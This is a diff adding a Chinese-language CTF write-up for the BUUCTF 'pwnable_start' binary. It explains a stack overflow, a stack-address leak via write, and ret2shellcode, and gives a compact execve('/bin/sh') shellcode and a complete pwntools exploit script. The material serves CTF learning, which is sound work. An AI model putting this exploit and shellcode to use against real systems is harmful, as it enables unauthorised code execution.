@@ -114,3 +114,99 @@ sl("/bin/sh")
 
 shell()
 ```
+## BUUCTF-pwnable_start
+函数逻辑简单 调用了系统调用write(1, 'esp', 0x14) 以及 read(0, 'esp', 0x3c)
+由于系统调用不会破坏栈的结构，所以当read返回后，add esp, 0x14 所以0x3c-0x14=40byte 是存在溢出的 可以覆盖返回地址
+
+<img width="347" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/255a03ef-c09c-4f0c-aaa2-688d045970a8">
+
+本题没有开启NX和canary 所以可以考虑ret2shellcode 但是我们不知道栈地址 而且也不存jmp esp这种gadget 所以首先要先泄漏栈地址
+
+先说一下我的做法 由于一步错误所以导致整个方法变得很复杂 
+
+第一次溢出返回到write@main 即
+
+<img width="437" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/ec391d91-a493-4a3d-80bf-4361b298fa7a">
+
+然后这次write系统调用会将栈顶保存的地址打印出来 即
+
+<img width="276" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/b33e9924-0b56-4be8-abff-d22ea2207b24">
+
+计算之后发现这个地址与当前栈顶的地址相差0x(x)2，x表示不确定，所以当时以为要爆破地址... 后来发现这个0x0a是由于我输入的时候用的是sendline
+
+多输入了一个换行 其实这个地址与返回地址应该是个固定偏移 --> 0x14
+
+这样就简单了 那么第二次输入我们只需要覆盖返回地址为泄漏的栈地址leak_stack + 0x14 然后在后面加上长度小于40-4shellcode即可 
+
+这里分享一种更短的shellcode写法 仅限于在栈上执行的shellcode 
+
+```python
+shellcode = asm('''
+	mov al, 11
+	xor ecx, ecx
+	xor edx, edx
+	mov ebx, esp
+	int 0x80
+	''')
+
+payload = b'A' * offset + p32(leak_stack+0x14+8) + b"/bin/sh\x00" 
+payload+= shellcode
+```
+
+原理就是 在覆盖返回地址时，在返回地址后加上"/bin/sh\x00"字符串，长度为8，然后将上面的shellcode写到"/bin/sh\x00"的后面
+
+这样在进行返回时 当前栈顶指向"/bin/sh\x00" 然后在执行shellcode时，就可以直接使用mov ebx, esp去传递"/bin/sh\x00"参数
+
+相比传统的shellcode需要将"/bin/sh\x00"压入栈中可以节省一定的空间（如果能够插入shellcode的长度不够时）
+
+### exp_pwnable_start
+```python
+from pwn import *
+p = process("./start")
+# p = remote("node4.buuoj.cn",26353)
+context.log_level = 'debug'
+context.arch = 'i386'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+offset = 0x14
+write_main = 0x08048087
+off_stack = 0x42
+
+shellcode = asm('''
+	mov al, 11
+	xor ecx, ecx
+	xor edx, edx
+	mov ebx, esp
+	int 0x80
+	''')
+
+print(len(shellcode))
+
+payload = b'A' * offset + p32(write_main)
+ru("Let's start the CTF:")
+
+raw_input("Ther")
+s(payload)
+
+leak_stack = u32(ru('\xff')[-4:])
+success("leak_stack ==> {}".format(hex(leak_stack)))
+
+payload = b'A' * offset + p32(leak_stack+0x14+8) + b"/bin/sh\x00" 
+payload+= shellcode
+
+raw_input("Ther")
+s(payload)
+
+shell()
+```
+
